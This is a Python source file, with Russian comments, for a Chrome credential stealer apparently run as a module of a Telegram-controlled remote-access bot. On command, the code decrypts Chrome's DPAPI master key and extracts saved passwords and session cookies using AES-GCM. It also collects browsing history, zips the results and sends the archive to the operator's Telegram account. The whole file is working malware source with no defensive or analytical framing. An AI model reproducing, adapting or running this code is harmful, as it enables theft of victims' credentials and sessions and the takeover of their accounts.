# ---- Imports ---- #
import os
import win32crypt
import json
import base64
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import shutil
import sqlite3
from aiogram import types
# ---- Imports ---- #

###############################################################################
#                                CHROME                                       #
###############################################################################

def Chrome(dp, bot, admin_id):
    @dp.message_handler(text_contains='Логи Chrome')
    async def chrome(message: types.Message):
        await bot.send_message(admin_id, 'Принято. Начинаю сбор данных Chrome.')
        try:
            def time(date):
                try:
                    return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
                except:
                    return "Can't decode"

            # ========== ПОЛУЧЕНИЕ МАСТЕР-КЛЮЧА ==========
            def get_master_key():
                try:
                    local_state_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
                    with open(local_state_path, "r", encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                    
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    encrypted_key = encrypted_key[5:]
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    return master_key
                except Exception as e:
                    print(f"Get master key error: {e}")
                    return None

            # ========== РАСШИФРОВКА С ВОЗВРАТОМ ОШИБКИ ==========
            def decrypt_password(encrypted_data, master_key):
                try:
                    if encrypted_data is None or len(encrypted_data) == 0:
                        return "Ошибка расшифровки"
                    
                    # Проверяем версию шифрования
                    if encrypted_data[0:3] == b'v10' or encrypted_data[0:3] == b'v11':
                        # Для Chrome 80+ (AES-GCM)
                        if len(encrypted_data) < 15:
                            return "Ошибка расшифровки"
                        
                        iv = encrypted_data[3:15]
                        payload = encrypted_data[15:]
                        
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        decrypted = cipher.decrypt(payload)
                        
                        if len(decrypted) >= 16:
                            decrypted = decrypted[:-16]
                        
                        result = decrypted.decode('utf-8', errors='ignore')
                        return result if result else "Ошибка расшифровки"
                    else:
                        # Для Chrome < 80 (DPAPI)
                        decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]
                        result = decrypted.decode('utf-8', errors='ignore')
                        return result if result else "Ошибка расшифровки"
                except Exception as e:
                    print(f"Decrypt error: {e}")
                    return "Ошибка расшифровки"

            # ========== ПОЛУЧАЕМ КЛЮЧ ==========
            master_key = get_master_key()
            if master_key is None:
                await bot.send_message(admin_id, 'Не удалось получить мастер-ключ Chrome')
                return

            # Создаем папку
            temp_dir = r'C:\hesoyam8927163\Chrome'
            os.makedirs(temp_dir, exist_ok=True)
            
            # ========== ИСТОРИЯ ==========
            temp_history = os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history_chrome.db'
            try:
                history_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
                if os.path.exists(history_db):
                    shutil.copy2(history_db, temp_history)
                    conn = sqlite3.connect(temp_history)
                    conn.text_factory = str
                    cursor = conn.cursor()
                    
                    temp_results = []
                    with open(f"{temp_dir}\\history-chrome.txt", "w", encoding="utf-8") as history_file:
                        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
                        for row in cursor.fetchall():
                            url = row[0] if row[0] else "No URL"
                            title = row[1] if row[1] else "No Title"
                            visit_time = time(row[2]) if row[2] else "Unknown"
                            
                            result = f"URL: {url}\nTitle: {title}\nLast Visit: {visit_time}\n\n"
                            if result not in temp_results:
                                temp_results.append(result)
                                history_file.write(result)
                    
                    conn.close()
                    if os.path.exists(temp_history):
                        os.remove(temp_history)
            except Exception as e:
                print(f"History error: {e}")
                if os.path.exists(temp_history):
                    try:
                        os.remove(temp_history)
                    except:
                        pass

            # ========== КУКИ ==========
            temp_cookies = os.environ['USERPROFILE'] + '\\AppData\\Roaming\\cookies_chrome.db'
            try:
                cookies_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies'
                if os.path.exists(cookies_db):
                    shutil.copy2(cookies_db, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    conn.text_factory = str
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT name FROM pragma_table_info('cookies')")
                    columns = [row[0] for row in cursor.fetchall()]
                    
                    if 'encrypted_value' in columns:
                        cookies_data = []
                        cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies")
                        
                        for row in cursor.fetchall():
                            try:
                                decrypted_value = decrypt_password(row[6], master_key)
                                # Экранируем кавычки для JSON
                                if decrypted_value and decrypted_value != "Ошибка расшифровки":
                                    decrypted_value = decrypted_value.replace('"', '\\"')
                                else:
                                    decrypted_value = "Ошибка расшифровки"
                                
                                cookie_entry = {
                                    "domain": row[0] if row[0] else "",
                                    "expirationDate": row[5] if row[5] else 0,
                                    "name": row[1].replace('"', '\\"') if row[1] else "",
                                    "httpOnly": bool(row[4]) if row[4] else False,
                                    "path": row[2].replace('"', '\\"') if row[2] else "/",
                                    "secure": bool(row[3]) if row[3] else False,
                                    "value": decrypted_value
                                }
                                cookies_data.append(cookie_entry)
                            except Exception as e:
                                print(f"Cookie decrypt error: {e}")
                                # Добавляем запись с ошибкой
                                cookie_entry = {
                                    "domain": row[0] if row[0] else "",
                                    "expirationDate": row[5] if row[5] else 0,
                                    "name": row[1].replace('"', '\\"') if row[1] else "",
                                    "httpOnly": bool(row[4]) if row[4] else False,
                                    "path": row[2].replace('"', '\\"') if row[2] else "/",
                                    "secure": bool(row[3]) if row[3] else False,
                                    "value": "Ошибка расшифровки"
                                }
                                cookies_data.append(cookie_entry)
                                continue
                        
                        if cookies_data:
                            with open(f"{temp_dir}\\Cookies-Chrome.json", "w", encoding="utf-8") as cookies_file:
                                json.dump(cookies_data, cookies_file, indent=2, ensure_ascii=False)
                    
                    conn.close()
                    if os.path.exists(temp_cookies):
                        os.remove(temp_cookies)
            except Exception as e:
                print(f"Cookies error: {e}")
                if os.path.exists(temp_cookies):
                    try:
                        os.remove(temp_cookies)
                    except:
                        pass

            # ========== ПАРОЛИ ==========
            temp_passwords = os.environ['USERPROFILE'] + '\\AppData\\Roaming\\loginvault_chrome.db'
            try:
                login_db = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
                if os.path.exists(login_db):
                    shutil.copy2(login_db, temp_passwords)
                    conn = sqlite3.connect(temp_passwords)
                    conn.text_factory = str
                    cursor = conn.cursor()
                    
                    with open(f"{temp_dir}\\chrome-passwords.txt", "w", encoding='utf-8') as passwords_file:
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        
                        for row in cursor.fetchall():
                            try:
                                url = row[0] if row[0] else "No URL"
                                username = row[1] if row[1] else ""
                                encrypted_password = row[2] if row[2] else b''
                                
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                                passwords_file.write(f"URL: {url}\n")
                                passwords_file.write(f"Username: {username}\n")
                                passwords_file.write(f"Password: {decrypted_password}\n")
                                passwords_file.write("---\n\n")
                            except Exception as e:
                                print(f"Password row error: {e}")
                                # Записываем ошибку для этой записи
                                try:
                                    url = row[0] if row[0] else "No URL"
                                    username = row[1] if row[1] else ""
                                    passwords_file.write(f"URL: {url}\n")
                                    passwords_file.write(f"Username: {username}\n")
                                    passwords_file.write(f"Password: Ошибка расшифровки\n")
                                    passwords_file.write("---\n\n")
                                except:
                                    continue
                    
                    conn.close()
                    if os.path.exists(temp_passwords):
                        os.remove(temp_passwords)
            except Exception as e:
                print(f"Passwords error: {e}")
                if os.path.exists(temp_passwords):
                    try:
                        os.remove(temp_passwords)
                    except:
                        pass

            # ========== ПРОВЕРКА ФАЙЛОВ ==========
            try:
                files_in_dir = os.listdir(temp_dir)
                if not files_in_dir:
                    await bot.send_message(admin_id, 'Не удалось собрать данные Chrome. Файлы не найдены.')
                    if os.path.exists(temp_dir):
                        shutil.rmtree(temp_dir)
                    return
            except:
                await bot.send_message(admin_id, 'Ошибка при проверке файлов Chrome.')
                return

            # ========== ОТПРАВКА ==========
            try:
                archive_name = 'chrome_data'
                shutil.make_archive(archive_name, 'zip', temp_dir)
                
                with open(f'{archive_name}.zip', 'rb') as archive_file:
                    await bot.send_document(admin_id, archive_file)
                
                if os.path.exists(f'{archive_name}.zip'):
                    os.remove(f'{archive_name}.zip')
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
                    
                await bot.send_message(admin_id, 'Данные Chrome успешно собраны и отправлены.')
                
            except Exception as e:
                print(f"Send error: {e}")
                await bot.send_message(admin_id, f'Ошибка при отправке архива Chrome: {str(e)}')
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
                
        except Exception as e:
            print(f"Main error: {e}")
            await bot.send_message(admin_id, f'Критическая ошибка Chrome: {str(e)}')
            try:
                temp_dir = r'C:\hesoyam8927163\Chrome'
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir)
            except:
                pass
